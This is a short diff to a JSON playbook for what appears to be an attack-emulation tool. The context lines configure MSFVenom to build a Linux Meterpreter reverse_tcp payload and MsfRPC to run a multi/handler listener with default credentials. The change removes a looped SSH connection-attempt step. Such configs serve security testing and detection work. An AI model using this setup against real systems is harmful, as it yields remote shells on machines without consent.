@@ -6,14 +6,6 @@
         { "name":"MSFVenom", "payload":"linux/x64/meterpreter/reverse_tcp", "skip":false, "platform":"linux", "format":"elf", "output":"meterpreter-linux" },
         { "name":"Sleep", "input":10 },
         { "name":"MsfRPC", "skip" : true, "command":"exploit", "user":"msf", "password":"msf", "command_argument":"multi/handler", "payload":"linux/x64/meterpreter/reverse_tcp"},
-        { 
-            "name": "hit_each",
-            "loop": true,
-            "target": "host",
-            "actions": [
-                { "name":"SSHConnectionAttempt" }
-            ]
-        }, 
         { "name":"Sleep", "input":10 },        
         {
             "name": "hit_each",
